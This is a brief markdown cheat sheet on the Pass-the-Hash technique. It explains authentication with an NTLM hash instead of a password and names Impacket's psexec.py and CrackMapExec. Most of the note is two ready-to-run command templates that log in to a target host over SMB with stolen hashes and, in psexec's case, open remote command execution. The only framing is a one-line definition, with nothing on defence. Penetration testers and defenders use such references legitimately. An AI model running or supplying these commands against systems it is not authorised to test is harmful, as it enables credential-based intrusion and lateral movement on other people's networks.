# Pass-The-Hash (PtH)

## Concept
- Authenticate using NTLM hash (no plaintext password).

## Tools
- `psexec.py` (Impacket).
- `CrackMapExec`.

## Commands
```bash
# Impacket
psexec.py DOMAIN/user@TARGET_IP -hashes LMHASH:NTHASH

# CrackMapExec
crackmapexec smb TARGET_IP -u user -H NTHASH
